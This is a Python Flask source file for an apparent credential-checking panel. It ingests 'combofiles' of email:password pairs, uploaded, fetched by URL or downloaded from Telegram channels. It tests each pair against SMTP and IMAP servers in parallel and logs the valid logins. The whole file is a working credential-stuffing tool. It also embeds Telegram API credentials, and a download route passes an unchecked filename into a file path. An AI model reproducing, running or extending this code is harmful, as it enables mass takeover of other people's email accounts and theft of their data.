import requests
import asyncio
import os
import aiofiles
import sys
import zipfile
import io
import re
from flask import Blueprint, jsonify, request, render_template, redirect, url_for, send_from_directory, send_file
from datetime import datetime
from asyncio import set_event_loop, new_event_loop, gather
import asyncio
from telethon import TelegramClient
import json
from .logging import logger_temp_smtp, logger_temp_imap, logger_smtp, logger_imap
from .utils import SmtpDriver, ImapDriver, chunks, extract_country_from_filename, remove_duplicate_lines

api_id = '29719825'
api_hash = '7fa19eeed8c2e5d35036fafb9a716f18'

sys.path.append('..')

# Create main API blueprint
api = Blueprint('main', __name__)


async def process_chunk(chunk, driver, results, logger):
    for cred in chunk:
        if "@" not in cred:
            continue
        if cred.count(":") != 1:
            continue
        email, password = cred.strip().split(":")
        try:
            status = await driver.check_connection(email, password)
            if status['status'] == 'valid':
                results.append(status)
            logger.info({'email': email, 'password': password, 'valid': status["status"],
                         'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')})
        except Exception as e:
            logger.error(f"Error checking connection for email {email}: {e}")



@api.route('/api/upload_file_by_url', methods=['POST'])
def upload_file_by_url():
    data = request.get_json()
    file_url = data.get('url')
    if not file_url:
        return jsonify({'status': 404, 'error': 'No URL provided'})

    try:
        response = requests.get(file_url)
        if response.status_code == 200:
            filename = os.path.basename(file_url).replace(" ", "_")
            country = extract_country_from_filename(filename)

            if country:
                save_path = os.path.join('app', 'data', 'combofiles', country)
            else:
                save_path = os.path.join('app', 'data', 'combofiles')

            os.makedirs(save_path, exist_ok=True)

            filepath = os.path.join(save_path, filename)
            with open(filepath, 'wb') as file:
                file.write(response.content)
            return jsonify({'status': 200, 'filename': filename})
        else:
            return jsonify({'status': 404, 'error': 'File not found'})
    except Exception as e:
        return jsonify({'status': 500, 'error': str(e)})


def is_valid_telegram_username(username):
    return re.match(r'^(https://t\.me/|@)?[a-zA-Z0-9_]{5,32}$', username)


async def parse_messages(client, channel):
    messages = []
    async for message in client.iter_messages(channel, limit=10):
        messages.append({
            'sender': message.sender_id,
            'date': message.date.strftime('%Y-%m-%d %H:%M:%S'),
            'text': message.text
        })
    return messages


async def read_existing_messages(filename):
    if os.path.exists(filename):
        async with aiofiles.open(filename, 'r', encoding='utf-8') as f:
            content = await f.read()
            return json.loads(content) if content else []
    return []


async def write_messages(filename, messages):
    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write(json.dumps(messages, ensure_ascii=False, indent=4))

@api.route('/api/upload_file_by_telegram', methods=['POST'])
async def telegram_add_channel():
    data = request.get_json()  
    channel = data.get('channel')
    
    if not channel or not is_valid_telegram_username(channel):
        return jsonify({'status': 400, 'error': 'Invalid Telegram link or username'}), 400

    sanitized_channel = re.sub(r'\W+', '_', channel)

    async def main():
        async with TelegramClient('session_name', api_id, api_hash) as client:
            messages = await parse_messages(client, channel)
            return messages

    new_messages = await main()
    
    filename = os.path.join('app','data', f'parsed_messages_{sanitized_channel}.json')
    os.makedirs(os.path.dirname(filename), exist_ok=True)

    existing_messages = await read_existing_messages(filename)
    
    existing_texts = {msg['text'] for msg in existing_messages}
    unique_messages = [msg for msg in new_messages if msg['text'] not in existing_texts]
    
    if unique_messages:
        combined_messages = existing_messages + unique_messages
        await write_messages(filename, combined_messages)
        return jsonify({'status': 200, 'messages': unique_messages, 'file': filename})
    else:
        return jsonify({'status': 200, 'message': 'No new unique messages to save.'})


@api.route('/', methods=['GET'])
def redirect_to_panel():
    return redirect(url_for('main.panel'))


@api.route('/panel', methods=['GET', 'POST'])
def panel():
    return render_template('index.html', active_page="dashboard")


@api.route('/panel/tables', methods=['GET', 'POST'])
def panel_table():
    return render_template('tables.html', active_page="tables")


@api.route('/panel/settings', methods=['GET', 'POST'])
def panel_settings():
    return render_template('settings.html', active_page="settings")


async def check_smtp_emails(filename):
    smtp_driver = SmtpDriver()
    smtp_results = []

    if filename.endswith('.zip'):
        with zipfile.ZipFile(os.path.join("app", "data", "combofiles", filename), 'r') as zip_file:
            for zip_info in zip_file.infolist():
                if not zip_info.is_dir():
                    with io.TextIOWrapper(zip_file.open(zip_info), encoding='utf-8') as f:
                        lines = f.readlines()
                        chunks_size = 100
                        chunk = list(chunks(lines, chunks_size))
                        tasks = [process_chunk(chunk, smtp_driver, smtp_results, logger_temp_smtp) for chunk in chunk]
                        await gather(*tasks)
    else:
        async with aiofiles.open(os.path.join("app", "data", "combofiles", filename), 'r') as f:
            lines = await f.readlines()
            chunks_size = 100
            chunk = list(chunks(lines, chunks_size))
            tasks = [process_chunk(chunk, smtp_driver, smtp_results, logger_temp_smtp) for chunk in chunk]
            await gather(*tasks)

    return smtp_results


async def check_imap_emails(filename):
    imap_driver = ImapDriver()
    imap_results = []

    if filename.endswith('.zip'):
        with zipfile.ZipFile(os.path.join("app", "data", "combofiles", filename), 'r') as zip_file:
            for zip_info in zip_file.infolist():
                if not zip_info.is_dir():
                    with io.TextIOWrapper(zip_file.open(zip_info), encoding='utf-8') as f:
                        lines = f.readlines()
                        chunks_size = 100
                        chunk = list(chunks(lines, chunks_size))
                        tasks = [process_chunk(chunk, imap_driver, imap_results, logger_temp_imap) for chunk in chunk]
                        await gather(*tasks)
    else:
        async with aiofiles.open(os.path.join("app", "data", "combofiles", filename), 'r') as f:
            lines = await f.readlines()
            chunks_size = 100
            chunk = list(chunks(lines, chunks_size))
            tasks = [process_chunk(chunk, imap_driver, imap_results, logger_temp_imap) for chunk in chunk]
            await gather(*tasks)

    return imap_results


@api.route('/api/check-emails-file/<filename>', methods=['GET'])
def check_emails_route(filename):
    loop = new_event_loop()
    set_event_loop(loop)
    try:
        tasks = [
            asyncio.ensure_future(check_smtp_emails(filename)),
            asyncio.ensure_future(check_imap_emails(filename))
        ]
        results = loop.run_until_complete(asyncio.gather(*tasks))
        smtp_results, imap_results = results
        result = {'smtp_results': smtp_results, 'imap_results': imap_results}
        return result
    except Exception as e:
        return {'error': str(e)}, 500
    finally:
        loop.close()


async def read_logs(ind):
    smtp_log_path = os.path.join("app", "data", "temp_logs", 'temp_smtp.log')
    imap_log_path = os.path.join("app", "data", "temp_logs", 'temp_imap.log')

    if not os.path.exists(smtp_log_path):
        async with aiofiles.open(smtp_log_path, 'w') as smtp_file:
            await smtp_file.write('')

    if not os.path.exists(imap_log_path):
        async with aiofiles.open(imap_log_path, 'w') as imap_file:
            await imap_file.write('')

    async with aiofiles.open(smtp_log_path, 'r') as smtp_file, aiofiles.open(imap_log_path, 'r') as imap_file:
        smtp_lines = await smtp_file.readlines()
        imap_lines = await imap_file.readlines()

    smtp_logs = list(map(lambda line: line.strip(), smtp_lines))[ind:ind + 100]
    imap_logs = list(map(lambda line: line.strip(), imap_lines))[ind:ind + 100]
    return jsonify({"smtp_logs": smtp_logs, "imap_logs": imap_logs, "n": len(smtp_logs)})


@api.route('/api/logs/<int:ind>', methods=['GET'])
async def get_logs(ind):
    logs = await read_logs(ind)
    return logs


@api.route('/api/clear_temp_logs', methods=['GET'])
async def clear_temp_logs():
    smtp_log_path = os.path.join("app", "data", "temp_logs", 'temp_smtp.log')
    imap_log_path = os.path.join("app", "data", "temp_logs", 'temp_imap.log')

    try:
        if os.path.exists(smtp_log_path):
            async with aiofiles.open(smtp_log_path, 'w') as smtp_file:
                await smtp_file.write('')
        if os.path.exists(imap_log_path):
            async with aiofiles.open(imap_log_path, 'w') as imap_file:
                await imap_file.write('')
        return {"message": "Logs cleared successfully"}, 200
    except Exception as e:
        print(e)
        return {"message": str(e)}, 500



@api.route('/api/clear_full_logs', methods=['GET'])
def clear_full_logs():
    smtp_log_path = os.path.join("app", "data", "temp_logs", 'smtp.log')
    imap_log_path = os.path.join("app", "data", "temp_logs", 'imap.log')

    try:
        os.remove(smtp_log_path)
        os.remove(imap_log_path)
        return {"message": "Logs cleared successfully"}, 200
    except FileNotFoundError:
        return {"message": "Log files not found"}, 404
    except Exception as e:
        return {"message": str(e)}, 500


async def download_files_from_tg(links):
    async with TelegramClient('session_name', api_id, api_hash) as client:
        files = []
        for link in links:
            message = await client.get_messages(link, limit=1)
            if message and message[0].media:
                file_path = await message[0].download_media()
                files.append(file_path)
        return files


@api.route('/api/get_combofiles_from_tg', methods=['GET'])
async def get_from_tg():
    links_file_path = os.path.join("data", "tg.txt")
    with open(links_file_path, 'r') as file:
        links = file.readlines()
        links = [link.strip() for link in links]

    files = await download_files_from_tg(links)

    if not files:
        return jsonify({"error": "No files found"}), 404

    zip_filename = "tg.zip"
    with zipfile.ZipFile(zip_filename, 'w') as zipf:
        for file in files:
            zipf.write(file, os.path.basename(file))

    try:
        return send_file(zip_filename, as_attachment=True)
    finally:
        os.remove(zip_filename)
        for file in files:
            os.remove(file)


# @api.route('/api/upload_combofile', methods=['POST'])
# def upload_combofile():
#     if 'file' not in request.files:
#         return jsonify({'status': 404, 'error': 'No file part'})
#     file = request.files['file']
#     if file.filename == '':
#         return jsonify({'status': 404, 'error': 'No file selected'})
#     if file:
#         filename = file.filename.replace(" ", "_")
#         country = extract_country_from_filename(filename)
#
#         if country:
#             save_path = os.path.join('app', 'data', 'combofiles', country)
#         else:
#             save_path = os.path.join('app', 'data', 'combofiles')
#
#         os.makedirs(save_path, exist_ok=True)
#
#         file.save(os.path.join(save_path, filename))
#         return jsonify({'status': 200, 'filename': filename})

@api.route('/api/upload_combofile', methods=['POST'])
def upload_combofile():
    if 'file' not in request.files:
        return jsonify({'status': 404, 'error': 'No file part'})
    file = request.files['file']
    if file.filename == '':
        return jsonify({'status': 404, 'error': 'No file selected'})
    if file:
        filename = file.filename.replace(" ", "_")
        country = extract_country_from_filename(filename)

        if country:
            save_path = os.path.join('app', 'data', 'combofiles', country)
        else:
            save_path = os.path.join('app', 'data', 'combofiles')

        os.makedirs(save_path, exist_ok=True)

        file_path = os.path.join(save_path, filename)
        file.save(file_path)

        num_duplicates = remove_duplicate_lines(file_path)
        print(f"Removed {num_duplicates} duplicate lines from {filename}")

        return jsonify({'status': 200, 'filename': filename})


@api.route('/api/download_combofile/<filename>', methods=['GET'])
def download_file(filename):
    directory = os.path.join("data", "combofiles")
    return send_file(os.path.join(directory, filename), as_attachment=True)


@api.route('/api/download_full_logs', methods=['GET'])
def download_logs_file():
    directory = os.path.join("data", "full_logs")
    files_to_zip = ["smtp.log", "imap.log"]
    zip_filename = "full_logs.zip"

    with zipfile.ZipFile(zip_filename, 'w') as zipf:
        for file in files_to_zip:
            file_path = os.path.join(directory, file)
            if os.path.exists(file_path):
                zipf.write(file_path, os.path.basename(file_path))

    try:
        return send_file(zip_filename, as_attachment=True)
    finally:
        os.remove(zip_filename)
